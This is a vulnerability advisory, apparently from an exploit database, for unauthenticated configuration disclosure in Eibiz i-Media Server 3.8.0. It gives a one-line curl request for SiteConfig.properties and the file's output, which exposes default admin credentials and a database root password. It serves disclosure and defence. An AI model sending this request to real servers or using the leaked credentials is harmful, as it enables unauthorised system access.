@@ -1,0 +1,82 @@
+# Exploit Title: Eibiz i-Media Server Digital Signage 3.8.0 - Configuration Disclosure
+# Date: 2020-08-21
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.eibiz.co.th
+# Version: <=3.8.0
+# CVE: N/A
+
+Eibiz i-Media Server Digital Signage 3.8.0 Configuration Disclosure
+
+
+Vendor: EIBIZ Co.,Ltd.
+Product web page: http://www.eibiz.co.th
+Affected version: <=3.8.0
+
+Summary: EIBIZ develop advertising platform for out of home media in that
+time the world called "Digital Signage". Because most business customers
+still need get outside to get in touch which products and services. Online
+media alone cannot serve them right place, right time.
+
+Desc: i-Media Server is vulnerable to unauthenticated configuration disclosure
+when direct object reference is made to the SiteConfig.properties file using an
+HTTP GET method. This will enable the attacker to disclose sensitive information
+and help her in authentication bypass, privilege escalation and/or full system access.
+
+Tested on: Windows Server 2016
+           Windows Server 2012 R2
+           Windows Server 2008 R2           
+           Apache Flex
+           Apache Tomcat/6.0.14
+           Apache-Coyote/1.1
+           BlazeDS Application
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5583
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5583.php
+
+
+26.07.2020
+
+--
+
+
+$ curl http://192.168.1.1/config/SiteConfig.properties
+server.mode=testing
+admin.username=admin
+admin.password=admin
+designer.username=designer
+designer.password=designer
+reporter.username=reporter
+reporter.password=reporter
+db.PriDBServerIp=127.0.0.1
+db.PriDBServerPort=3306
+db.PriDBServerUser=root
+db.PriDBServerPwd=eibiz1234
+db.PriDBName=imediadb
+account.appId=1
+account.RootPath=C:/iMediaServWeb/tomcat/webapps/ROOT/
+account.ContentPath=C:/iMediaServWeb/tomcat/webapps/ROOT/
+account.imediasuitURL=http://localhost:8080/UserAPI/v1/user/applogin
+account.ReportInteractive=0
+account.ReportPlayer=1
+account.ReportMedia=1
+account.ReportTransfer=1
+ConcurrentDownload=10
+BindingAddress=192.168.1.1
+ServicePort=643
+EndPointPort=644
+AndroidServicePort=8080
+AndroidEndPointPort=8081
+RequireApprove=
+OutgoingMailServer=
+MailUser=
+MailPassword=
+mongodb.PriMongoDBName=imediadb_sandbox
+mongodb.PriMongoDBServerIp=localhost
+mongodb.PriMongoDBServerPort=27017
+mongodb.PriMongoDBUser=
+mongodb.PriMongoDBPwd=
